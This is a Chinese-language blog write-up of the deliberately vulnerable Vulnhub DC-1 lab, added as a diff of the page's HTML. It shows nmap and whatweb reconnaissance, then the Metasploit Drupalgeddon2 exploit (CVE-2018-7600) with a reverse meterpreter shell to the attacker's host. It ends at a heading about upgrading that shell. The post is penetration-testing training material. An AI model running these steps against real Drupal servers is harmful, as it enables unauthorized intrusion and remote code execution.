@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Vulnhub DC-1 Writeup - Laughing</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:" target="_blank" rel="noopener">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-17 15:05" pubdate>
+        November 17, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Vulnhub DC-1 Writeup</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="Vunhub-DC-1-Writeup"><a href="#Vunhub-DC-1-Writeup" class="headerlink" title="Vunhub DC-1 Writeup"></a>Vunhub DC-1 Writeup</h1><h2 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">（官方地址）</a></p>
+<pre><code class="hljs vim">DESCRIPTION
+DC-<span class="hljs-number">1</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> purposely built vulnerable lab <span class="hljs-keyword">for</span> the purpose of gaining experience in the world of penetration testing.
+
+It was designed <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> <span class="hljs-keyword">a</span> challenge <span class="hljs-keyword">for</span> beginners, but just how easy it <span class="hljs-keyword">is</span> will depend <span class="hljs-keyword">on</span> your skills <span class="hljs-built_in">and</span> knowledge, <span class="hljs-built_in">and</span> your ability <span class="hljs-keyword">to</span> learn.
+
+To successfully <span class="hljs-built_in">complete</span> this challenge, you will require Linux skills, familiarity with the Linux <span class="hljs-keyword">command</span> <span class="hljs-built_in">line</span> <span class="hljs-built_in">and</span> experience with basic penetration testing tools, such <span class="hljs-keyword">as</span> the tools that can <span class="hljs-keyword">be</span> found <span class="hljs-keyword">on</span> Kali Linux, <span class="hljs-built_in">or</span> Parrot Security OS.
+
+There are multiple ways of gaining root, however, I have included some flags which contain clues <span class="hljs-keyword">for</span> beginners.
+
+There are five flags in total, but the ultimate goal <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">read</span> the flag in root<span class="hljs-string">'s home directory. You don'</span>t even need <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> root <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> this, however, you will require root privileges.
+
+Depending <span class="hljs-keyword">on</span> your skill level, you may <span class="hljs-keyword">be</span> able <span class="hljs-keyword">to</span> skip finding most of these flags <span class="hljs-built_in">and</span> <span class="hljs-keyword">go</span> straight <span class="hljs-keyword">for</span> root.
+
+Beginners may encounter challenges that they have never come across previously, but <span class="hljs-keyword">a</span> Google <span class="hljs-built_in">search</span> should <span class="hljs-keyword">be</span> <span class="hljs-keyword">all</span> that <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> obtain the information required <span class="hljs-keyword">to</span> <span class="hljs-built_in">complete</span> this challenge.</code></pre>
+
+
+
+<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117150857.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="nmap发现DC-1主机"><a href="#nmap发现DC-1主机" class="headerlink" title="nmap发现DC-1主机"></a>nmap发现DC-1主机</h2><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># nmap 192.168.43.*</span>
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:57 EST
+Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.1
+Host is up (0.044s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+16080/tcp open  osxwebadmin
+MAC Address: 26:C8:92:E7:C9:C5 (Unknown)
+
+Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.160
+Host is up (0.00011s latency).
+Not shown: 992 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2382/tcp open  ms-olap3
+3306/tcp open  mysql
+3389/tcp open  ms-wbt-server
+5357/tcp open  wsdapi
+MAC Address: 34:E1:2D:52:8D:7F (Intel Corporate)
+
+Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.165
+Host is up (0.00016s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+111/tcp open  rpcbind
+MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)
+
+Nmap scan report <span class="hljs-keyword">for</span> 192.168.43.225
+Host is up (0.0000050s latency).
+All 1000 scanned ports on 192.168.43.225 are closed
+
+Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 3.08 seconds</code></pre>
+
+<h2 id="nmap详细扫描"><a href="#nmap详细扫描" class="headerlink" title="nmap详细扫描"></a>nmap详细扫描</h2><pre><code class="hljs shell">root@kali:~# nmap 192.168.43.165 -A -sV -sC -p 1-65535
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:04 EST
+Nmap scan report for 192.168.43.165
+Host is up (0.00026s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Welcome to Drupal Site | Drupal Site
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          37330/tcp6  status
+|   100024  1          37494/tcp   status
+|   100024  1          51572/udp   status
+|_  100024  1          57636/udp6  status
+37494/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:34:B3:8F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.26 ms 192.168.43.165
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.82 seconds</code></pre>
+
+<p>看80端口是什么样子的</p>
+<p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201117153044.png" srcset="/img/loading.gif" alt=""></p>
+<p>可以看到有一个登陆界面</p>
+<h2 id="whatweb扫描网页的CMS指纹"><a href="#whatweb扫描网页的CMS指纹" class="headerlink" title="whatweb扫描网页的CMS指纹"></a>whatweb扫描网页的CMS指纹</h2><pre><code class="hljs shell">root@kali:~# whatweb http://192.168.43.165/
+http://192.168.43.165/ [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.43.165], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]</code></pre>
+
+<p>CMS是Drupal 7，接下来尝试看看msfconsole</p>
+<h2 id="方法1：msfconsole"><a href="#方法1：msfconsole" class="headerlink" title="方法1：msfconsole"></a>方法1：msfconsole</h2><pre><code class="hljs bash">msf5 &gt; search drupal target:7.x
+
+Matching Modules
+================
+
+   <span class="hljs-comment">#  Name                                      Disclosure Date  Rank       Check  Description</span>
+   -  ----                                      ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</code></pre>
+
+<p>搜索到一个exploit，查看一下info</p>
+<pre><code class="hljs bash">msf5 &gt; info exploit/unix/webapp/drupal_drupalgeddon2
+
+       Name: Drupal Drupalgeddon 2 Forms API Property Injection
+     Module: exploit/unix/webapp/drupal_drupalgeddon2
+   Platform: PHP, Unix, Linux
+       Arch: php, cmd, x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2018-03-28
+
+Provided by:
+  Jasper Mattsson
+  a2u
+  Nixawk
+  FireFart
+  wvu &lt;wvu@metasploit.com&gt;
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic (PHP In-Memory)
+  1   Automatic (PHP Dropper)
+  2   Automatic (Unix In-Memory)
+  3   Automatic (Linux Dropper)
+  4   Drupal 7.x (PHP In-Memory)
+  5   Drupal 7.x (PHP Dropper)
+  6   Drupal 7.x (Unix In-Memory)
+  7   Drupal 7.x (Linux Dropper)
+  8   Drupal 8.x (PHP In-Memory)
+  9   Drupal 8.x (PHP Dropper)
+  10  Drupal 8.x (Unix In-Memory)
+  11  Drupal 8.x (Linux Dropper)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name         Current Setting  Required  Description
+  ----         ---------------  --------  -----------
+  DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output
+  PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute
+  Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]
+  RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
+  RPORT        80               yes       The target port (TCP)
+  SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
+  TARGETURI    /                yes       Path to Drupal install
+  VHOST                         no        HTTP server virtual host
+
+Payload information:
+  Avoid: 3 characters
+
+Description:
+  This module exploits a Drupal property injection <span class="hljs-keyword">in</span> the Forms API. 
+  Drupal 6.x, &lt; 7.58, 8.2.x, &lt; 8.3.9, &lt; 8.4.6, and &lt; 8.5.1 are 
+  vulnerable.
+
+References:
+  https://cvedetails.com/cve/CVE-2018-7600/
+  https://www.drupal.org/sa-core-2018-002
+  https://greysec.net/showthread.php?tid=2912
+  https://research.checkpoint.com/uncovering-drupalgeddon-2/
+  https://github.com/a2u/CVE-2018-7600
+  https://github.com/nixawk/labs/issues/19
+  https://github.com/FireFart/CVE-2018-7600
+
+Also known as:
+  SA-CORE-2018-002
+  Drupalgeddon 2</code></pre>
+
+<p>看得info里面的target信息有对应的版本，尝试使用这个exploit，首先要设置option，这里只需要set rhost，再run一下</p>
+<pre><code class="hljs bash">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.43.165
+rhosts =&gt; 192.168.43.165
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; options 
+
+Module options (exploit/unix/webapp/drupal_drupalgeddon2):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   DUMP_OUTPUT  <span class="hljs-literal">false</span>            no        Dump payload <span class="hljs-built_in">command</span> output
+   PHP_FUNC     passthru         yes       PHP <span class="hljs-keyword">function</span> to execute
+   Proxies                       no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]
+   RHOSTS       192.168.43.165   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
+   RPORT        80               yes       The target port (TCP)
+   SSL          <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
+   TARGETURI    /                yes       Path to Drupal install
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.43.225   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (PHP In-Memory)
+
+
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run
+
+[*] Started reverse TCP handler on 192.168.43.225:4444 
+[*] Sending stage (38288 bytes) to 192.168.43.165
+[*] Meterpreter session 1 opened (192.168.43.225:4444 -&gt; 192.168.43.165:35033) at 2020-11-25 06:35:32 -0500
+
+meterpreter &gt;</code></pre>
+
+<p>msfconsole就会返回一个shell？尝试ls命令</p>
+<pre><code class="hljs bash">meterpreter &gt; ls
+Listing: /var/www
+=================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  567    fil   2020-11-20 10:05:39 -0500  .bash_history
+100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore
+100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess
+100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt
+100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt
+100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt
+100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt
+100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt
+100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt
+100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt
+100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt
+100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt
+100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php
+100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php
+100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes
+100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php
+100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles
+100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt
+40755/rwxr-xr-x   4096   dir   2020-11-19 05:34:49 -0500  scripts
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites
+40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes
+100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php
+100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config
+100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</code></pre>
+
+<p>可是连一个whoami都用不了</p>
+<pre><code class="hljs bash">meterpreter &gt; whoami
+[-] Unknown <span class="hljs-built_in">command</span>: whoami.</code></pre>
+
+<p>输入shell进入一个？？？,这里可以用whoami了</p>
+<pre><code class="hljs bash">meterpreter &gt; shell
+Process 3100 created.
+Channel 0 created.
+ls
+COPYRIGHT.txt
+INSTALL.mysql.txt
+INSTALL.pgsql.txt
+INSTALL.sqlite.txt
+INSTALL.txt
+LICENSE.txt
+MAINTAINERS.txt
+README.txt
+UPGRADE.txt
+authorize.php
+cron.php
+flag1.txt
+includes
+index.php
+install.php
+misc
+modules
+profiles
+robots.txt
+scripts
+sites
+themes
+update.php
+web.config
+xmlrpc.php
+whoami 
+www-data</code></pre>
+
+<p>但是有些命令不可以用，比如su就明确说我们的这个不是来自terminal的命令</p>
+<pre><code class="hljs bash">sudo
+/bin/sh: 7: sudo: not found
+vim
+/bin/sh: 8: vim: not found
+su
+su: must be run from a terminal</code></pre>
+
+<p>而且，按住ctrl+c会停止这个反弹的shell，也就是说这个shell不够完美</p>
+<pre><code class="hljs bash">^C
+Terminate channel 0? [y/N]  
+[-] core_channel_interact: Operation failed: 1</code></pre>
+
+<h3 id="python将简单的Shell转换成为完全交互式的TTY"><a href="#python将简单的Shell转换成为完全交互式的TTY" class="headerlink" title="python将简单的Shell转换成为完全交互式的TTY"></a>python将简单的Shell转换成为完全交互式的TTY</h3>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/05/%E6%8A%80%E6%9C%AF%E5%90%8D%E8%AF%8D%E5%B7%A5%E5%85%B7%E7%99%BE%E7%A7%91%E9%A1%B5%E9%9D%A2/">
+                        <span class="hidden-mobile">技术/名词/工具百科页面</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Vulnhub DC-1 Writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
